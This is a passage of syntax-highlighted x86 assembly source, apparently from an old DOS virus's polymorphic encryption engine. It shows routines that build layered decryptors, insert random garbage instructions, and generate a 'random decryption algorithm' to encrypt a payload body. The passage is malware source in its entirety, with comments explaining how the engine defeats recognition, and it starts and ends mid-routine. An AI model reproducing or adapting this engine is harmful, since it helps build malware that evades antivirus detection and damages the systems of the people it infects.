        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">mom_copy_from_stack_tm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_sp_pointer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; copy all the math</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; ops from stack zone</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mops_tmptable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; to mem storage</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">mom_copy_from_stack_tm</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mops_tmptable</span><span class="sc0">    </span><span class="sc1">; from</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; to stack zone</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">reverse_mom_copy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; so copy the math ops</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; on mem in reverse</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">reverse_mom_copy</span><span class="sc0">        </span><span class="sc1">; order on stack</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">mom_copy_from_stack_tm_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; and now copy the</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mops_tmptable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; registers pairs from</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; stack to temp mem</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">mom_copy_from_stack_tm_2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mops_tmptable</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">reverse_mom_copy_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; and now just put them</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; in rev order again</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; on the stack</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">reverse_mom_copy_2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">create_or_just_read</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_used_table</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_table_inv</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_loop_begin_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_math_on_mem_ops</span><span class="sc0">    </span><span class="sc1">; everything ready on</span><span class="sc0">
                            </span><span class="sc1">; stack, so just create</span><span class="sc0">
                            </span><span class="sc1">; the dec instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_actual_layer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_reg_bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_reg_di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_ended_inmem_pnt</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_ended_inmem_pnt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_end_after_rda_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_pnt_addr_vals</span><span class="sc0">       </span><span class="sc1">; now correct inits</span><span class="sc0">
                            </span><span class="sc1">; for "normal" exec</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_loop_end_pos</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; last calculations</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_di_pointer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; on lenght</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_actual_layer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; correct stack</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; layer finished</span><span class="sc0">


</span><span class="sc1">;        ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ</span><span class="sc0">

</span><span class="sc1">; this is the rda engine</span><span class="sc0">
</span><span class="sc5">rda_and_body_encrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">end_most_internal_layer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; how many entries from table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; gets 4 random entries from the first table. each entry is 4 bytes long</span><span class="sc0">
</span><span class="sc1">; and will be used as a base for the RDA generation later.</span><span class="sc0">
</span><span class="sc5">fill_first_part_rda</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; each entry in table is 4 bytes</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_from_table_part_1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_to_part_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_from_table_part_1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_to_part_1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; next destination</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">fill_first_part_rda</span><span class="sc0">


</span><span class="sc1">; gets 16 random entries from the second table. each entry is 2 bytes long.</span><span class="sc0">
</span><span class="sc1">; aswell as the entry the loop stores also, on the opposite side of the</span><span class="sc0">
</span><span class="sc1">; table, the coordinated second entry (other 2 bytes) that actually does</span><span class="sc0">
</span><span class="sc1">; the exact inverse operation.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; how many entries from table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">fill_second_part_rda</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">     </span><span class="sc1">; 10 possible</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_from_table_part_2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; 2nd tbl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_to_part_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; get the contra</span><span class="sc0">

</span><span class="sc5">tbl2_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_from_table_part_2_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_from_table_part_2</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">tbl2_len</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_from_table_part_2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tbl2_len</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">40h</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">; from end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_to_part_2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; half table</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">fill_second_part_rda</span><span class="sc0">

</span><span class="sc1">; now the basic rda code will be copied in place with some garbage inserted.</span><span class="sc0">
</span><span class="sc1">; please check the comments at the rda_steps_table and the loop below for some</span><span class="sc0">
</span><span class="sc1">; hints on how it works.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_basic_body</span><span class="sc0">   </span><span class="sc1">; to basic rda body</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rda_steps_table</span><span class="sc0">     </span><span class="sc1">; to steps</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C4h</span><span class="sc0">            </span><span class="sc1">; nr of steps</span><span class="sc0">

</span><span class="sc5">rda_add</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_address_buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_basic_body</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">; must equ 1df3h</span><span class="sc0">

</span><span class="sc1">; rda_add will be used to point with si to the memory buffer where the</span><span class="sc0">
</span><span class="sc1">; address of each generated step (from the steps table) will be stored</span><span class="sc0">
</span><span class="sc1">; (so later offset correction, ie. for jumps, can be calculated with this</span><span class="sc0">
</span><span class="sc1">; informations). the way of addressing this memory zone is structured in</span><span class="sc0">
</span><span class="sc1">; a way so that the address of a given instruction pointed by si is stored</span><span class="sc0">
</span><span class="sc1">; in si + rda_add. of course for the thing to work we can address just each</span><span class="sc0">
</span><span class="sc1">; 2 bytes, so you'll see in the steps table that there isn't any 1 byte only</span><span class="sc0">
</span><span class="sc1">; step (so the rets, that should be 1 byte only, are padded with one more byte)</span><span class="sc0">


</span><span class="sc5">main_rda_loop_body</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">rda_add</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rda_garbage_limits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; reset limit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get step type</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">just_copy_whatever</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">garbage_in_rda_skip_typelim1</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rda_garbage_limits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">garbage_in_rda_skip_typelim1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">just_copy_whatever_new_regcompat</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rda_garbage_limits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">just_copy_whatever_new_regcompat</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; hold register compatibility</span><span class="sc0">
                        </span><span class="sc1">; info, that is which can be</span><span class="sc0">
                        </span><span class="sc1">; used as garbage</span><span class="sc0">
</span><span class="sc5">just_copy_whatever</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; hold nr of bytes to copy</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">          </span><span class="sc1">; copy needed stuff</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">some_reg_is_usable_for_grb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">move_for_next_loop</span><span class="sc0">

</span><span class="sc5">some_reg_is_usable_for_grb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; all regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; usable</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; set to the mask</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; given by the table</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">; how many garbage instrs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">move_for_next_loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">rda_garbage_loop_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rda_garbage_limits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">some_type_limit_set</span><span class="sc0">

</span><span class="sc5">select_a_reg_rdag</span><span class="sc4">:</span><span class="sc0">
